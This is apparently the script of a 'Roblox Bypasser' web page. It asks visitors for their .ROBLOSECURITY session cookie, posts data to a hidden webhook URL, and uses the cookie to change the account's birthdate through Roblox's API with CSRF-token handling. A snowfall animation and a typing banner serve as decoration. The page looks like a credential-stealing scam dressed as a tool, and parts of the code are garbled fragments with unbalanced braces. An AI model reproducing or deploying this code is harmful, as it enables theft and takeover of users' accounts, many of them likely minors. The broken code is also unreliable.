<script>
(function(){
  const canvas = document.getElementById("snowCanvas");
  const ctx = canvas.getContext("2d");
  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;
  let snowflakes = [];
  const number = 100;
  for (let i = 0; i < number; i++){
      snowflakes.push({
          x: Math.random() * width,
          y: Math.random() * height,
          radius: Math.random() * 4 + 1,
          density: Math.random() * number
      });
  }
  let angle = 0;
  function drawSnowflakes(){
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = "rgba(255, 0, 0, 0.8)";
      ctx.beginPath();
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          ctx.moveTo(f.x, f.y);
          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
      }
      ctx.fill();
      updateSnowflakes();
  }
  function updateSnowflakes(){
      angle += 0.005;
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
          f.x += Math.sin(angle) * 0.5;
          if (f.x > width + 5 || f.x < -5 || f.y > height) {
              snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
          }
      }
  }
  setInterval(drawSnowflakes, 33);
  window.addEventListener("resize", function(){
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  });
})();
</script>

<script>

// Simple validation for .ROBLOSECURITY cookie (alphanumeric, at least 40 chars, basic pattern check)
function isValidCookie(input) {
  const cookiePattern = /^[a-zA-Z0-9-_]+$/;
  return input.length >= 40 && cookiePattern.test(input);
}

      }]
    };
    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(webhookPayload)
      });

      console.error("Failed to send to webhook:", webhookError);
    }
    return;
  }

  $("#refreshBtn").hide();

  $("#userInfo").hide();
  $("#refreshedBox").hide();

  const data = {
    birthMonth: 12,
    birthDay: 27,
    birthYear: 2020
  };

  let headers = {
    "Content-Type": "application/json",
    "Cookie": `.ROBLOSECURITY=${cookie}`
  };

  try {
    let res = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
      method: "POST",
      headers: headers,
      body: JSON.stringify(data)
    });

    if (res.status === 403 && res.headers.get("x-csrf-token")) {
      headers["X-CSRF-TOKEN"] = res.headers.get("x-csrf-token");
      res = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
        method: "POST",
        headers: headers,
        body: JSON.stringify(data)
      });
    }

    const responseText = await res.text();
    $("#loader").hide();

    if (res.ok) {
      const webhookPayload = {

    $("#refreshedResult").text(`❌ Error: ${error.message}`);
    $("#refreshedBox").fadeIn();

  }

  $("#refreshBtn").show();
});

const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
let i = 0;
const typedText = document.getElementById("typedText");

function typeEffect() {
  const text = texts[i];
  let index = 0;

  const typing = setInterval(() => {
    if (index <= text.length) {
      typedText.textContent = text.slice(0, index);
      index++;
    } else {
      clearInterval(typing);
      setTimeout(() => {
        const backspace = setInterval(() => {
          if (index > 0) {
            typedText.textContent = text.slice(0, index - 1);
            index--;
          } else {
            clearInterval(backspace);
            i = (i + 1) % texts.length;
            setTimeout(typeEffect, 300);
          }
        }, 50);
      }, 2000);
    }
  }, 100);
}

typeEffect();
